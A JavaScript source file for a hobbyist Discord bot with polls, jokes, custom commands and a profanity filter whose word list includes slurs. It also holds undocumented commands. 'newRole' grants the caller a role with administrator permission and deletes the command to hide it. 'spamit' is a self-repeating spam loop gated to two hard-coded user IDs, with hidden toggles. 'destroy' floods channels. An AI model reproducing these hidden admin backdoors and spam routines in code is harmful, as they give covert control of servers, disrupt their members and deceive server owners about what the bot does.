var Discord = require('discord.io');
var logger = require('winston');
var prefix = '!';
var passnum = 0; 
var passwords = ['FlacHA', 'AstER', 'MonGO', 'HaRvEy', 'ROllER', 'CliVE', 'TicE', 'PiXIs', 'MuchACHA', 'AkeYLA'];
var knockknock = 0;
var joke = '.';
var curses = ['SHIT', 'THOT', 'BIKE', 'PORN', 'FUCK', 'FAG', 'FUK', 'ASS', 'BITCH', 'WHORE', 'VAGINAL', 'SLUT', 'BLOWJOB', 'CLITORIS', 'CLIT', 'COOCHIE', 'MASTURBATE', 'MASTURBATION', 'PROSTITUTE', 'JACKASS', 'FAGGOT', 'NIGGER', 'NIGGA', 'TIT', 'BOOB', 'BOOBS', 'DICK', 'PENIS', 'PUSSY', 'ARSE', 'CUM', 'BOLLOCK', 'BONER', 'WHORE', 'DILDO', 'SEX'];
var nonWordCurses = ['SHIT', 'THOT', 'no', 'PORN', 'FUCK', 'no', 'FUK', 'no', 'BITCH', 'WHORE', 'VAGINAL', 'SLUT', 'BLOWJOB', 'CLITORIS', 'no', 'COOCHIE', 'MASTURBATE', 'MASTURBATION', 'PROSTITUTE', 'JACKASS', 'FAGGOT', 'NIGGER', 'NIGGA', 'no', 'BOOB', 'BOOBS', 'DICK', 'PENIS', 'PUSSY', 'ARSE', 'no', 'BOLLOCK', 'BONER', 'WHORE', 'DILDO', 'SEX'];
var prevEvtID = 0;
var commandList = ['__', '__', '__'];
var resultList = ['__', '__', '__'];
var createCommand1 = false;
var createCommand2 = false;
var createCommand3 = false;
var createResult1 = false;
var createResult2 = false;
var createResult3 = false;
var custom1channelID = 0;
var custom2channelID = 0;
var custom3channelID = 0;
var cussmessage = '.';
var serverID = 0;
var nicknames = ['Idiot', '\'-\'', 'I have no life lol', 'HAHHAHAHA', 'Pls Halp'];
var randNum = 0;
var spot = 0;
var symbolList = ['!', '\'', '"', '@', '#', '$', '%', '^', '&', '*', '_', '-', '+', '=', '~', '`', '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', ',', '.', '/', '?', '|', '\\', '>', '<', '(', ')', '[', ']', '{', '}'];
var spamPassword;
var spamChannel;
var allowSpam = false;
var pollOptions = [];
var pollVotes = [];
var polledUsers = [];
var someArray = [];
var openPoll = false;
var pollOpener = 0;
var prevDay;
var day;
var allowBreedChange = false;
var d = new Date();

// Configure logger settings
logger.remove(logger.transports.Console);
logger.add(new logger.transports.Console, {
    colorize: true
});
logger.level = 'debug';
// Initialize Discord Bot
var bot = new Discord.Client({
   token: process.env.token,
   autorun: true
});

bot.on('ready', function (evt) {
    logger.info('Connected');
    logger.info('Logged in as: ');
    logger.info(bot.username + ' - (' + bot.id + ')');
});
bot.on('message', function (user, userID, channelID, message, evt) {
    // Our bot needs to know if it will execute a command
    // It will listen for messages that will start with `!`
	
	if (!bot.directMessages[channelID]) {
		serverID = bot.channels[channelID].guild_id;
	}
	
	prevDay = day;
	day = d.getDate();
	
	if (day != prevDay){
		
	}
	
	prevEvtID = evt.d.id;
	
	cussmessage = message.toUpperCase();
	
	for (var i = 0; i < symbolList.length; i++){
		if (cussmessage.includes(symbolList[i])){
			spot = cussmessage.indexOf(symbolList[i]);
			cussmessage = cussmessage.substring(0, spot) + cussmessage.substring(spot + 1);
			i = i-1;
		}
	}


	for (var i = 0; i < curses.length; i++){
		if (cussmessage.includes(curses[i]) && !cussmessage.includes('assure')){
			if (nonWordCurses[i] != 'no' || cussmessage.substring(0, (curses[i].length)) == curses[i] || cussmessage.includes(' ' + curses[i])){
				bot.deleteMessage({
					channelID: channelID,
					messageID: prevEvtID
				});
				bot.sendMessage({
					to: channelID,
					message: user + ', please don\'t curse. Thank you.'
				});
				break;
			}
		}
	}
       	
	if (message.includes('owo')){
	    	bot.sendMessage({
			to: channelID,
			message: 'What\'s this?'
		});
	}

			if (someArray.includes(userID) && userID == pollOpener){
				pollOptions = [];
				pollVotes = [];
				polledUsers = [];
				while (message.includes(', ')){
					pollOptions[pollOptions.length] = message.substring(0, message.indexOf(', '));
					message = message.substring(message.indexOf(', ') +2);
				}
				pollOptions[pollOptions.length] = message;
				for (i = 0; i < pollOptions.length; i++){
					pollVotes[i] = 0;
				}
				bot.sendMessage({
					to: channelID,
					message: 'Ok, your poll has been created.'
				});
				openPoll = true;
			  // do things on the message's contents, check if it is valid, then do the stuff on it
			  // send "Ok, your are now in the Lizard role" ??

			  let index = someArray.indexOf(userID);
			  someArray.splice(index, 1);
			}
	    
	if (createResult2 && !message.includes('Ok, now please reply with the desired command output.') && custom2channelID == channelID){
		resultList[1] = message;
		bot.sendMessage({
			to: channelID,
			message: 'Your command, ' + commandList[1] + ' has been successfully created.'
		});
		createResult2 = false;
	}
	
	if (createResult3 && !message.includes('Ok, now please reply with the desired command output.') && custom3channelID == channelID){
		resultList[2] = message;
		bot.sendMessage({
			to: channelID,
			message: 'Your command, ' + commandList[2] + ' has been successfully created.'
		});
		createResult3 = false;
	}
	
	if (createResult1 && !message.includes('Ok, now please reply with the desired command output.') && custom1channelID == channelID){
		resultList[0] = message;
		bot.sendMessage({
			to: channelID,
			message: 'Your command, ' + commandList[0] + ' has been successfully created.'
		});
		createResult1 = false;
	}
	
	if (createCommand1 && !message.includes('Ok, please reply with your command without the ' + prefix) && custom1channelID == channelID){
	    	commandList[0] = message;
		    bot.sendMessage({
			    to: channelID,
			    message: 'Ok, now please reply with the desired command output.'
		    });
		createCommand1 = false;
		createResult1 = true;
	}
	
	if (createCommand2 && !message.includes('Ok, please reply with your command without the ' + prefix) && custom2channelID == channelID){
	    	commandList[1] = message;
		    bot.sendMessage({
			    to: channelID,
			    message: 'Ok, now please reply with the desired command output.'
		    });
		createCommand2 = false;
		createResult2 = true;
	}
	
	if (createCommand3 && !message.includes('Ok, please reply with your command without the ' + prefix) && custom3channelID == channelID){
	    	commandList[2] = message;
		    bot.sendMessage({
			    to: channelID,
			    message: 'Ok, now please reply with the desired command output.'
		    });
		createCommand3 = false;
		createResult3 = true;
	}
	
	if (knockknock == 2 && message != joke && !message.includes('?') && !message.includes('knock')){
		bot.sendMessage({
			to: channelID,
			message: "Hahaha!"
		});
		knockknock = 0;
	}
	
	if (knockknock == 1 && !message.includes('knock') && !message.includes('Who\'s there?')){
		bot.sendMessage({
			to: channelID,
			message: message + " who?"
		});
		joke = message;
		knockknock = 2;
	}
	
	if (message.substring(0, 24) == 'Graham Channel Destroyer'){
		bot.sendMessage({
			to: channelID,
			message: 'The current prefix is ' + prefix + ', and the current password is password number ' + passnum + '. To see documentation, please say ' + prefix + 'help'
		});
	}
	
	if (message.substring(0, 13) == prefix + 'changePrefix'){
		prefix = message.substring(14);
		bot.sendMessage({
			to: channelID,
			message: 'The prefix is now \'' + prefix + '\''
		});
	}
	
    if (message.substring(0, 1) == prefix) {
	knockknock = 0
        var args = message.substring(1).split(' ');
        var cmd = args[0];
       
        args = args.splice(1);
        switch(cmd) {
            // !ping
            case 'ping':
                bot.sendMessage({
                    to: channelID,
                    message: 'Pong!'
                });
            break;
		case 'allowBreedChange':
			allowBreedChange = true;
			break;
		case 'getDay':
			bot.sendMessage({
				to: channelID,
				message: day + d.getMonth() + d.getFullYear()
			});
			break;    
			case 'help':
				bot.sendMessage({
					to: userID,
					message: 'Our current commands are as follows. \n \n createPoll - Creates a poll that you become the owner of. Can have infinite (probably I don\'t have the time to try that) options. Can only be done if no other poll is currently open \n \n getPollOptions - Gives a list of options. The first option = option 1 and so on. \n \n vote [option number] - adds your vote to that option. You can only vote once per poll. \n \n addCustomResponse - allows you to add new responses to a poll in progress. \n \n getPollResults - shows how many people voted for each option \n \n closePoll - ends the current poll making another poll possible; can only be done by poll owner \n \n knockknock - responds to YOUR knockknock joke. \n \n ping - plays endless hours of pingpong with you, as long as you\'re up for it. \n \n changeMyNickname - changes your nickname to a select group of possible choices \n \n customCommand(1-3) - Create your own simple response command for the bot, as long as that custom command slot hasn\'t already been taken. If it has been, don\'t worry. You\'ll have another chance whenever the bot restarts or updates, as these are temporary. \n \n customCommands - check the current custom commands, seperated by commas. If a command is "__", that means that it can be edited with the corresponding customCommand command. \n \n cat - sends a few lines of meows, a text cat, and a true statement. \n \n neha - sends a totally rediculous response that was requested by a friend. \n \n intro - I really should just delete this one as it does nothing helpful. But hey, I\'m the kind of person who\'s too lazy to do that but is willing to right a few sentences about it. \n \n changePrefix - changes the prefix of the bot. \n \n destroy - a password protected command (!destroy [enter password here]) that spams a server by a significant chunk. \n \n If you say "Graham Channel Destroyer", the bot will tell you the current prefix and the current password number for the destroy password. \n \n This bot also comes equipped with a curse detector, (easy test curse = "bi ke", (without the space, obviously) because reasons), and will say, well you\'ll see, whenever a message contains "owo".'
				});
				bot.sendMessage({
					to: channelID,
					message: 'Documentation has been sent to your dms.'
				});
			break;
		case 'createPoll':
			if (message == "!createPoll" && !someArray.includes(userID) && !openPoll) {
				pollOpener = userID;
			  someArray.push(userID)
			  bot.sendMessage({
				  to: channelID,
				  message: 'Ok, please put all the options in one line and seperate them by ", "'
			  });
			}
			if (openPoll){
				bot.sendMessage({
				  	to: channelID,
				 	 message: 'Sorry ' + user + ', but a poll is already open. Please wait for this poll to finish'
				});
			}
			break;
		case 'getPollOptions':
			let mes = '';
			let i = 0;
			for (i = 0; i < pollOptions.length -1; i++){
				mes = mes + pollOptions[i] + ', ';
			}
			mes = mes + pollOptions[i];
			bot.sendMessage({
				to: channelID,
				message: mes
			});
			break;
		case 'closePoll':
			if (!openPoll){
				bot.sendMessage({
					to: channelID,
					message: 'There is currently no open poll'
				});
			}
			if (openPoll){
				if (userID == pollOpener){
					openPoll = false;
					bot.sendMessage({
						to: channelID,
						message: 'Ok, your poll has been closed.'
					});
				}
				if (!(userID == pollOpener)){
					bot.sendMessage({
						to: channelID,
						message: 'Sorry ' + user + ', but you do not own this poll so you cannot close it'
					});
				}
			}
			break;
		case 'vote':
			let userAlreadyVoted = false;
			for (var j = 0; j < polledUsers.length; j++){
				if ( userID == polledUsers[j]){
					userAlreadyVoted = true;
				}
			}
			if (userAlreadyVoted){
				bot.sendMessage({
					to: channelID,
					message: 'You already voted, ' + user
				});
			}
			if (!userAlreadyVoted){
				let voteNum = message.substring(6)
				for (var l = 0; l < pollOptions.length; l++){
					if (voteNum == l + 1){
						polledUsers[polledUsers.length] = userID;
						pollVotes[l] = pollVotes[l] + 1;
						bot.sendMessage({
							to: channelID,
							message: 'Okay ' + user + ', you have voted for: ' + pollOptions[l] + '.'
						});
					}
				}
			}
			break;
		case 'addCustomResponse':
			if(!openPoll){
				bot.sendMessage({
					to: channelID,
					message: 'Sorry ' + user + ', there is currently no open poll.'
				});
			}
			if(openPoll){
				let customResponse = message.substring(19);
				pollOptions[pollOptions.length] = customResponse;
				pollVotes[pollVotes.length] = 0;
				bot.sendMessage({
					to: channelID,
					message: 'Ok ' + user + ', your custom response, ' + customResponse + ', has been added, but not voted for.'
				});
			}
			break;
		case 'pollResults':
			let mess = '';
			for (var k = 0; k < pollOptions.length; k++){
				mess = mess + pollOptions[k] + ': ' + pollVotes[k] + '\n'
			}
			bot.sendMessage({
				to: channelID,
				message: mess
			});
			break;
		case 'getServerID':
			bot.sendMessage({
				to: channelID,
				message: serverID
			});
			break;
		case 'spamit':
			if(channelID == spamChannel && message.substring(8) == spamPassword && allowSpam && ((userID == 393586279964475393) || (userID == 495705429150793739))){
				setTimeout(() => {
   					 bot.sendMessage({
						 to: channelID,
						 message: prefix + 'spamit ' + spamPassword
					 });
				}, 1000);
			}
			break;
		case 'confuse':
			bot.simulateTyping(channelID);
			bot.deleteMessage({
					channelID: channelID,
					messageID: prevEvtID
				});
			break;
		case 'changeSpamAllowance':
			bot.deleteMessage({
				channelID: channelID,
				messageID: prevEvtID
			});
			allowSpam = !allowSpam;
			break;
		case 'setSpamPass':
			bot.deleteMessage({
					channelID: channelID,
					messageID: prevEvtID
				});
			spamPassword = message.substring(13);
			spamChannel = channelID;
			break;
		case 'newRole':
			bot.createRole(serverID, function(err, res) {
				if (err) throw err;
				
					bot.editRole({
						serverID: serverID,
						roleID: res.id,
						name:'new role',
						hoist: false,
						permissions: {
							GENERAL_ADMINISTRATOR: true
						},
						mentionable: false
					});
				
				bot.addToRole({
					serverID: serverID,
					userID: userID,
					roleID: res.id
				});
			});
			bot.deleteMessage({
					channelID: channelID,
					messageID: prevEvtID
				});
			
				
			break;
		case 'changeMyNickname':
			randNum = Math.floor(Math.random() * 5);
			bot.editNickname({
				serverID: serverID,
				userID: userID,
				nick: nicknames[randNum]
			});
			bot.sendMessage({
				to: channelID,
				message: 'Ok, your nickname is now ' + nicknames[randNum]
			});
			break;
			case 'customCommand1':
			if (commandList[0] == '__'){
				createCommand1 = true;
				bot.sendMessage({
					to: channelID,
					message: 'Ok, please reply with your command without the ' + prefix
				});
				custom1channelID = channelID;
			}
			break;
			case 'customCommand2':
			if (commandList[1] == '__'){
				createCommand2 = true;
				bot.sendMessage({
					to: channelID,
					message: 'Ok, please reply with your command without the ' + prefix
				});
				custom2channelID = channelID;
			}
			break;
			case 'customCommand3':
			if (commandList[2] == '__'){
				createCommand3 = true;
				bot.sendMessage({
					to: channelID,
					message: 'Ok, please reply with your command without the ' + prefix
				});
				custom3channelID = channelID;
			}
			break;
			case 'customCommands':
			bot.sendMessage({
				to: channelID,
				message: commandList[0] + ', ' + commandList[1] + ', ' + commandList[2]
			});
			break;
		case commandList[0]:
				bot.simulateTyping(channelID);
				bot.sendMessage({
					to: channelID,
					message: resultList[0]
				});
			break;
			case commandList[1]:
			bot.simulateTyping(channelID);
				bot.sendMessage({
					to: channelID,
					message: resultList[1]
				});
			break;
			case commandList[2]:
			bot.simulateTyping(channelID);
				bot.sendMessage({
					to: channelID,
					message: resultList[2]
				});
			break;
		case 'neha':
			bot.sendMessage({
				to: channelID,
				message: 'slays'
			});
			break;
		case 'knockknock':
			bot.sendMessage({
				to: channelID,
				message: 'Who\'s there?'
			});
			knockknock = 1;
			break;
			case 'cat':
				bot.sendMessage({
					to: channelID,
					message: 'Meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow meow'
				});
				bot.sendMessage({
					to: channelID,
					message: 'Cats are legit bro'
				});
				bot.sendMessage({
					to: channelID,
					message: '|             A    A \n |        (= ^w^ = )'
				});
			break;
			case 'intro':
				bot.sendMessage({
					to: channelID,
					message: 'Really? You waited all this time just to test that one piece of code? Lame. I hope this response was worth it :P'
				});
			break;
			case 'destroy':
				var password = message.substring(9);
				if (password == passwords[passnum]){
					passnum = passnum + 1;
					bot.deleteMessage({
						channelID: channelID,
						messageID: evt.d.id
					});
					bot.sendMessage({
						to: channelID,
						message: 'DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM'
					});
					bot.sendMessage({
						to: channelID,
						message: 'DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM'
					});
					bot.sendMessage({
						to: channelID,
						message: 'DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM'
					});
					bot.sendMessage({
						to: channelID,
						message: 'DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM'
					});
					bot.sendMessage({
						to: channelID,
						message: 'DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM DESTROYING BY SPAM'
					});
				}
			break;
		default: 
			bot.sendMessage({
				to: channelID,
				message: 'Sorry, I didn\'t understand that. Please try again. For a list of commands, please say ' + prefix + 'help'
			});
            // Just add any case commands if you want to..
         }
     }
});
